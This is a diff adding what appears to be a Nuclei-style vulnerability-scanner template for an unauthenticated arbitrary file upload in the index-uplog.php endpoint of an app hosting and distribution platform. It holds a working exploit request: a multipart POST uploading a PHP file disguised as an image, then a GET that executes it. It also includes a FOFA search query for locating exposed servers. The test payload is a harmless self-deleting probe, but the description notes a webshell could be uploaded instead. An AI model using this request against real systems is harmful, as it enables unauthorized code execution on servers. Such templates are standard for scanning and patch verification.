@@ -1,0 +1,40 @@
+http:
+    - matchers:
+        - part: body
+          type: word
+          words:
+            - "24642"
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          POST /source/pack/upload/2upload/index-uplog.php HTTP/1.1
+          Host: {{Hostname}}
+          Content-Type: multipart/form-data; boundary=----WebKitFormBoundary03rNBzFMIytvpWhy
+
+          ------WebKitFormBoundary03rNBzFMIytvpWhy
+          Content-Disposition: form-data; name="time"
+
+          1-2
+          ------WebKitFormBoundary03rNBzFMIytvpWhy
+          Content-Disposition: form-data; name="app"; filename="1.php"
+          Content-Type: image/jpeg
+
+          <?php print(111*222);unlink(__FILE__);?>
+          ------WebKitFormBoundary03rNBzFMIytvpWhy--
+        - |
+          GET /source/data/tmp/1-2.php HTTP/1.1
+          Host: {{Hostname}}
+id: Apptuoguan-index-uplog-File-upload
+info:
+    author: Superhero
+    description: |-
+        fofa: body="/api/statistics/service-usage-amount"
+        App托管服务分发平台 index-uplog.php 接口处存在任意文件上传漏洞，未经身份验证的远程攻击者可利用此漏洞上传webshell致服务器，执行任意代码，从而获取服务器权限。
+    name: App托管服务分发平台 index-uplog.php 文件上传
+    reference:
+        - https://blog.csdn.net/m0_60571842/article/details/139972168
+    severity: high
+    tags: []
